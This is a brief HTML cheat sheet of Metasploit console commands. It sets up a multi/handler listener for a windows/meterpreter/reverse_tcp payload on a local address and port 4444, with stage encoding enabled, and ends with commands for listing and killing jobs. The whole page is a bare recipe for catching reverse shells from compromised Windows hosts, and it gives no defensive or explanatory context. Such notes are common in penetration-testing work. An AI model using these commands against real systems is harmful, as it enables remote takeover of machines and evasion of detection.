<title>MSFConsole</title>
</head><body>Reverse TCP<br/>
msfconsole&gt; use multi/handler<br/>
msfconsole&gt; set payload windows/meterpreter/reverse_tcp<br/>
msfconsole&gt; set lhost 10.10.10.1<br/>
msfconsole&gt; set lport 4444<br/>
msfconsole&gt; set exitonsession false<br/>
msfconsole&gt; set enablestageencoding true<br/>
<br/>
<br/>
Jobs<br/>
msfconsole&gt; jobs -K<br/>
msfconsole&gt; jobs -L</body></html>
